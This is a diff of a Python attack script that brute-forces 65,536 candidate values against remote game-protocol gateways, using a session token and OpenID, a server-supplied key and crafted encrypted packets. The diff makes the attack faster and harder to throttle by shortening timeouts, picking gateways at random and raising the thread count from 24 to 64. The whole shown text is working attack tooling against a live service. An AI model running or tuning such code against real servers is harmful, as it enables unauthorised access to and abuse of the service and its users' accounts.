@@ -30,13 +30,13 @@ found=[]; stop=threading.Event(); lock=threading.Lock()
 counter=[0]; total=65536; t0=time.time()
 def attempt(tail, gw):
     try:
-        s=socket.create_connection(gw,timeout=2.5); s.settimeout(0.5)
+        s=socket.create_connection(gw,timeout=2.0); s.settimeout(0.4)
     except Exception:
         return
     try:
         key=None
         s.sendall(bytes(raw))
-        end=time.time()+1.2
+        end=time.time()+0.8
         buf=b""
         while time.time()<end and not key:
             try: ch=s.recv(65536)
@@ -50,9 +50,9 @@ def attempt(tail, gw):
         pt=core.encode()+b"\x00"*(64-len(core)-7)+bytes([random.randrange(256)])+b"tsf4g"+b"\x07"
         body=iv+enc(key,iv,pt)
         h=bytearray(bytes.fromhex(FS["raw2001_header"].replace(" ",""))); struct.pack_into(">H",h,19,len(body))
-        s.sendall(bytes(h)+body); s.settimeout(0.8)
+        s.sendall(bytes(h)+body); s.settimeout(0.5)
         buf=b""
-        end=time.time()+0.9
+        end=time.time()+0.6
         while time.time()<end:
             try: ch=s.recv(65536)
             except socket.timeout: break
@@ -82,7 +82,7 @@ def attempt(tail, gw):
         try: s.close()
         except Exception: pass
 def worker(wid):
-    gw=GATEWAYS[wid%len(GATEWAYS)]
+    gw=GATEWAYS[random.randrange(len(GATEWAYS))]
     while not stop.is_set():
         with lock:
             n=counter[0]
@@ -91,8 +91,8 @@ def worker(wid):
         attempt(n, gw)
         if wid==0 and counter[0]%1000==0:
             print("[*] progress %d/%d elapsed=%.0fs"%(counter[0],total,time.time()-t0),flush=True)
-print("[*] token",TOKEN[:16],"openid",OPENID,"threads 24",flush=True)
-ths=[threading.Thread(target=worker,args=(i,),daemon=True) for i in range(24)]
+print("[*] token",TOKEN[:16],"openid",OPENID,"threads 64",flush=True)
+ths=[threading.Thread(target=worker,args=(i,),daemon=True) for i in range(64)]
 for t in ths: t.start()
 for t in ths: t.join()
 if not found: print("[-] not found",flush=True)
